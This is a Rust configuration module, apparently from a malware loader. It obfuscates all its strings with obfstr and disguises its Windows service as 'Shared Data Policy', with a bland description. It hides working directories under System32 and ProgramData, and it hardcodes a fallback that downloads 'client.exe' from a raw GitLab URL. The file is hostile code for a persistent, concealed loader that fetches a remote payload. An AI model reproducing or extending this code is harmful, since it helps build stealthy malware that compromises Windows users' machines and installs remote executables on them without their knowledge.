use std::path::PathBuf;
use obfstr::obfstr as s;
use shared::utils::functions::{ programdata_dir, system32_dir };
use crate::types::receive::FlSrc;

pub fn loader_service_name() -> String {
    s!("SHDPolicySvc").to_owned()
}

pub fn loader_service_display_name() -> String {
    s!("Shared Data Policy").to_owned()
}

pub fn loader_service_description() -> String {
    s!("This service is used for Data Sharing scenarios").to_owned()
}

pub fn system_log_directory() -> PathBuf {
    system32_dir().join(s!("Shasum32"))
}

pub fn initial_log_directory() -> PathBuf {
    programdata_dir().join(s!("SharedLibrary"))
}

pub fn loader_version() -> u64 {
    2
}
pub fn system_service_directory() -> PathBuf {
    system32_dir().join(s!("wbem")).join(s!("tms"))
}

pub fn hardcoded_client_fallback_source() -> Option<FlSrc> {
    Some(FlSrc::Url(s!("https://gitlab.com/boarng/lajrso/-/raw/main/client.exe").to_owned()))
}
pub fn hardcoded_client_version() -> u64 {
    2
}

pub fn loader_tag() -> String {
    s!("vscode").to_owned()
}
